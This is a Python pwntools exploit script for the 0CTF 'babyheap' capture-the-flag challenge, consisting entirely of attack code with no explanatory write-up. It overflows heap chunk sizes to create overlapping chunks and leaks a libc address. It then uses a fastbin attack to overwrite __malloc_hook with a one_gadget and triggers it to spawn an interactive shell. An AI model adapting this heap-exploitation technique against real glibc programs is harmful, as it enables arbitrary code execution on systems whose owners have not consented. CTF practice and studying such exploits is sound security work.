#!/usr/bin/python

from pwn import *

#r = remote("pwnhost.local",7331)
r = process("./0ctfbabyheap")

pause()

def alloc(size):
        r.sendline("1")
        r.recvuntil("Size:")
        r.sendline(str(size))
        r.recvuntil("Command:")

def fill(idx,size,data):
        r.sendline("2")
        r.recvuntil("Index:")

        r.sendline(str(idx))
        r.recvuntil("Size:")

        r.sendline(str(size))
        r.recvuntil("Content:")

        r.sendline(data)
        r.recvuntil("Command:")


def free(idx,inter="No"):
        if inter =="No":
                r.sendline("3")
                r.recvuntil("Index:")
                r.sendline(str(idx))
                r.recvuntil("Command:")
        elif inter == "Yes":
                r.sendline("3")
                r.recvuntil("Index:")
                r.sendline(str(idx))                

def dump(idx):
        r.sendline("4")
        r.recvuntil("Index:")
        r.sendline(str(idx))




alloc(0x100-8) #0
alloc(0x100-8) #1
alloc(0x90-8)  #2
alloc(0x70-8)  #3

free(1)

fill(0,0x100,"A"*(0x100-8)+p64(0x191))

alloc(0x190-8)

fill(1,0x100,"B"*(0x100-8)+p64(0x91))

free(2)

dump(1)

r.recvuntil(p64(0x91))

libc_leak = u64(r.recv(8)) - 88
__malloc_hook = libc_leak - 0x10
fake_chunk = __malloc_hook - 35
libc_base = __malloc_hook - 0x3c4b10

one_gadget = libc_base + 0xf02a4
print "BASE  @",hex(libc_base)

alloc(0x90-8)  #2
alloc(0x70-8)  #4

free(4)
free(3)

fill(2,0xa0-8,"F"*(0x90-8)+p64(0x71)+p64(fake_chunk))

alloc(0x70-8) #3
alloc(0x70-8) #4 __malloc_hook

fill(4,27,"A"*19+p64(one_gadget))

fill(2,0xa0-8,"F"*(0x90-8)+'FFFFFFFF'*2)


free(4,inter="Yes")
r.interactive()
